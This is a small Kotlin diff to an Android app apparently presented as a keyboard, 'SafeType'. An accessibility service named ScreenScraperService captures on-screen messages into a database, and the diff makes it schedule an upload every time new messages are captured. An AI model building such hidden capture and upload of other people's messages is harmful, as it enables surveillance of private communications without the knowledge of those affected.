@@ -12,6 +12,7 @@ import androidx.core.app.NotificationCompat
 import com.safetype.keyboard.data.DedupEngine
 import com.safetype.keyboard.data.MessageEntity
 import com.safetype.keyboard.data.MessageDatabase
+import com.safetype.keyboard.data.UploadWorker
 import com.safetype.keyboard.scraper.*
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -187,6 +188,10 @@ class ScreenScraperService : AccessibilityService() {
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to insert message", e)
             }
+        }
+
+        if (messages.isNotEmpty()) {
+            UploadWorker.scheduleQuickUpload(applicationContext)
         }
     }
 
